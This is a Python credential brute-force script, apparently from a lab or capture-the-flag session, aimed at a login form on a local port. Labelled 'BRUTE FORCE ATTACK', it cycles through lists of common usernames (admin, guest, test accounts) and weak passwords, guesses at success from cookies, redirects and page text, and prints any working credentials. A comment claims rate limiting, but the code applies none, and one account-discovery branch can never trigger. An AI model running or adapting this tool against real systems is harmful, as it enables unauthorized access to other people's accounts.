#!/usr/bin/env python3
import requests
import sys

# Target URL
target = "http://127.0.0.1:33134/login"

# Success indicators that might be missed by our previous script
success_patterns = [
    "Location: /dashboard",
    "Location: /welcome",
    "Location: /home",
    "Set-Cookie: session",
    "window.location.href",
    "window.location.replace",
    "top.location.href",
    "<title>Dashboard",
    "<title>Welcome",
    "User Profile",
    "Logged in as",
    "Logout",
    "Sign out",
    "Welcome,",
    "Hello,"
]

# Test username patterns that might exist
users_to_test = [
    # Original working credential
    "test1",
    # Similar test users
    "test2", "test3", "test4", "test5",
    # Number patterns
    "test01", "test02", "test03", "test04", "test05",
    "test10", "test11", "test12", "test13", "test14", "test15",
    # User variants
    "user1", "user2", "user3", "user4", "user5",
    "user01", "user02", "user03", "user04", "user05",
    "user10", "user11", "user12", "user13", "user14", "user15",
    # Generic test accounts
    "test", "testing", "tester", "testuser", "test_user",
    "testaccount", "test_account",
    # System accounts
    "demo", "guest", "default", "sample", "example",
    # Admin patterns
    "admin", "admin1", "admin2", "admin01", "admin02",
    "adminuser", "administrator", "system", "system1",
    # Other common patterns
    "account1", "account2", "webuser", "web_user",
    "service", "service1", "application", "appuser",
    "operator", "backup", "manager", "user",
]

# Passwords to try for each user - username as password first
password_prefixes = [
    "",  # Try username as password
    "password",  # Standard passwords
    "123",
    "1234",
    "12345",
    "123456",
    "admin",
    "default",
]

def is_successful(response):
    """Better success detection"""
    
    # Check HTTP status codes that indicate success
    if response.status_code in [200, 302, 301]:
        
        # Check for Set-Cookie (session started)
        if response.status_code == 302 or 'Set-Cookie' in response.headers:
            return True, f"Cookie set: {response.headers.get('Set-Cookie', '')[:50]}"
        
        # Check response body for dashboard patterns
        text = response.text.lower()
        success_keywords = [
            "dashboard", "welcome", "profile", "logged in", "log out",
            "sign out", "my account", "user panel", "control panel"
        ]
        
        for keyword in success_keywords:
            if keyword in text:
                return True, f"Contains: {keyword}"
        
        # Check response length (might indicate different page)
        if len(response.text) > 500:  # Dashboard pages are usually larger
            # Check if it's not an error page
            error_keywords = ["invalid", "incorrect", "failed", "denied", "error", "exception"]
            has_error = any(e in text for e in error_keywords)
            
            if not has_error:
                return True, f"Large response: {len(response.text)} bytes (no error keywords)"
    
    return False, f"Status: {response.status_code}, Size: {len(response.text)}"

def test_login(username):
    """Test login for a single username"""
    
    # Method 1: Try username as password
    success, result = test_credentials(username, username)
    if success:
        return True, username, username, result
    
    # Method 2: Try common variations
    for prefix in ["password", "pass", "pwd"]:
        for suffix in ["", "1", "123"]:
            password = f"{prefix}{suffix}"
            success, result = test_credentials(username, password)
            if success:
                return True, username, password, result
    
    # Method 3: Try standard passwords
    standard_passwords = ["admin", "default", "123456", "welcome", "secret", "test"]
    for password in standard_passwords:
        success, result = test_credentials(username, password)
        if success:
            return True, username, password, result
    
    return False, username, None, "No working password found"

def test_credentials(username, password):
    """Test a single username/password combination"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        data = {"username": username, "password": password}
        response = requests.post(target, headers=headers, data=data, timeout=5, allow_redirects=False)
        
        success, reason = is_successful(response)
        return success, f"{username}:{password} - {reason}"
    except Exception as e:
        return False, f"ERROR: {username}:{password} - {str(e)}"

print("=" * 70)
print("BRUTE FORCE ATTACK - Extended Username/Password Testing")
print("=" * 70)
print(f"Target: {target}")
print(f"Total users to test: {len(users_to_test)}")
print("=" * 70)

valid_credentials = []
tested_count = 0

for username in users_to_test:
    print(f"\n--- Testing username: {username} ---")
    
    success, u, p, result = test_login(username)
    tested_count += 1
    
    if success:
        valid_credentials.append((u, p, result))
        print(f"✓ SUCCESS: {u}:{p}")
        print(f"  Reason: {result}")
        
        # Also try to find additional accounts by testing similar patterns
        if u.startswith("test") and u.isdigit():
            for i in range(1, 21):
                test_user = f"test{i}"
                if test_user != u:
                    print(f"  Testing similar: {test_user}")
                    s2, u2, p2, r2 = test_login(test_user)
                    if s2:
                        valid_credentials.append((u2, p2, r2))
                        print(f"  ✓ Found additional: {u2}:{p2}")
                        
    else:
        print(f"✗ Failed: {result}")
    
    # Rate limiting for safety
    if tested_count % 10 == 0:
        print(f"Progress: {tested_count}/{len(users_to_test)} tested")

print("\n" + "=" * 70)
print("FINAL RESULTS - VALID CREDENTIALS FOUND")
print("=" * 70)

if valid_credentials:
    for username, password, reason in valid_credentials:
        print(f"✓ {username}:{password}")
        print(f"  Detected by: {reason}")
else:
    print("No valid credentials found. The application may have:")
    print("- Anti-brute force protection")
    print("- Very limited user accounts")
    print("- Different authentication mechanism")

print(f"\nTotal valid credentials discovered: {len(valid_credentials)}")
print("=" * 70)
EOF
cat enhanced_brute.py
